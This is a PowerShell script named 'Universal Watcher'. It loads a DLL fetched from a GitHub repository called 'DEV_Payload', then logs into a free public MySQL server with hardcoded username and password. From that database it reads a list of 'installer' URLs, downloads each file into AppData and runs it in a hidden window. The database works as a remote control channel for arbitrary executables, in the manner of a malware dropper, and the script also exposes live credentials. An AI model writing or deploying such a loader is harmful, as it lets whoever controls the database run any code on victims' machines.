# ===============================
# UNIVERSAL WATCHER PS1 SCRIPT
# Cleaned and Modernized Version
# ===============================

# Load Windows Forms for MessageBox
Add-Type -AssemblyName PresentationFramework

# -------------------------------
# 0. Check .NET Framework 4.6.2+
# -------------------------------
$minimumRelease = 394802  # .NET 4.6.2 Release Key
$dotNetRegKey = "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

try {
    $installedRelease = (Get-ItemProperty -Path $dotNetRegKey -Name Release -ErrorAction Stop).Release
} catch {
    $installedRelease = 0
}

if ($installedRelease -lt $minimumRelease) {
    [System.Windows.MessageBox]::Show(".NET Framework 4.6.2 or later is not installed. Downloading installer...", "Dynamic Watcher")

    $dotNetInstallerUrl = "https://download.microsoft.com/download/9/9/F/99F4E0DA-2B83-48E6-8F0A-1D3FA8263FDE/NDP462-KB3151800-x86-x64-AllOS-ENU.exe"
    $installerPath = Join-Path -Path $env:TEMP -ChildPath "NDP462-KB3151800.exe"

    try {
        Write-Host "Downloading .NET Framework 4.6.2 installer..."
        Invoke-WebRequest -Uri $dotNetInstallerUrl -OutFile $installerPath -UseBasicParsing

        [System.Windows.MessageBox]::Show("Downloaded .NET Framework installer. Running setup...", "Dynamic Watcher")
        
        $process = Start-Process -FilePath $installerPath -ArgumentList "/quiet", "/norestart" -Wait -PassThru

        if ($process.ExitCode -eq 0) {
            [System.Windows.MessageBox]::Show(".NET Framework installed successfully. Please reboot your system.", "Dynamic Watcher")
        } else {
            [System.Windows.MessageBox]::Show("Installer exited with code $($process.ExitCode). Please install manually.", "Dynamic Watcher")
        }
        exit 0
    } catch {
        [System.Windows.MessageBox]::Show("Failed to download or install .NET Framework: $($_.Exception.Message)", "Dynamic Watcher")
        exit 1
    }
} else {
    Write-Host ".NET Framework 4.6.2 or later is already installed."
}

# -------------------------------
# 1. Dependency Check & Download
# -------------------------------
$AppDataPath = [Environment]::GetFolderPath("ApplicationData")
$DependencyPath = Join-Path -Path $AppDataPath -ChildPath "MySql.Data.dll"
$DependencyUrl = "https://github.com/Umair13303/DEV_Payload/raw/refs/heads/main/EXE_FILE/SQL_Library/net462/MySql.Data.dll"

if (-not (Test-Path $DependencyPath)) {
    [System.Windows.MessageBox]::Show("Dependency missing. Downloading MySql.Data.dll...", "Dynamic Watcher")
    try {
        Write-Host "Downloading MySql.Data.dll..."
        Invoke-WebRequest -Uri $DependencyUrl -OutFile $DependencyPath -UseBasicParsing
        [System.Windows.MessageBox]::Show("Downloaded MySql.Data.dll successfully.", "Dynamic Watcher")
    } catch {
        [System.Windows.MessageBox]::Show("Failed to download MySql.Data.dll: $($_.Exception.Message)", "Dynamic Watcher")
        exit 1
    }
} else {
    Write-Host "Dependency exists: $DependencyPath"
}

# -------------------------------
# 2. Load Dependency
# -------------------------------
try {
    Add-Type -Path $DependencyPath
} catch {
    [System.Windows.MessageBox]::Show("ERROR loading MySql.Data.dll: $($_.Exception.Message)", "Dynamic Watcher")
    exit 1
}

# -------------------------------
# 3. Connect to Database
# -------------------------------
$ConnectionString = "server=sql7.freesqldatabase.com;port=3306;uid=sql7788502;pwd=Y3jJUaTBR4;database=sql7788502"

try {
    $Connection = New-Object MySql.Data.MySqlClient.MySqlConnection $ConnectionString
    $Connection.Open()
    [System.Windows.MessageBox]::Show("Connected to database successfully.", "Dynamic Watcher")
} catch {
    [System.Windows.MessageBox]::Show("Database connection failed: $($_.Exception.Message)", "Dynamic Watcher")
    exit 1
}

# -------------------------------
# 4. Query Installer Table
# -------------------------------
$Query = "SELECT Id, GuID, URL FROM Installer WHERE IsActive=1"
$Command = $Connection.CreateCommand()
$Command.CommandText = $Query

try {
    $Reader = $Command.ExecuteReader()
    while ($Reader.Read()) {
        $Guid = $Reader["GuID"]
        $Url = $Reader["URL"]
        $TargetFile = Join-Path -Path $AppDataPath -ChildPath $Guid

        [System.Windows.MessageBox]::Show("Downloading: $Url", "Dynamic Watcher")
        try {
            Write-Host "Downloading $Url..."
            Invoke-WebRequest -Uri $Url -OutFile $TargetFile -UseBasicParsing

            Start-Process -FilePath $TargetFile -WindowStyle Hidden
            [System.Windows.MessageBox]::Show("Downloaded and executed: ${Guid}", "Dynamic Watcher")
        } catch {
            [System.Windows.MessageBox]::Show("Failed to download or execute ${Guid}: $($_.Exception.Message)", "Dynamic Watcher")
        }
    }
    $Reader.Close()
} catch {
    [System.Windows.MessageBox]::Show("ERROR during DB operation: $($_.Exception.Message)", "Dynamic Watcher")
} finally {
    $Connection.Close()
}
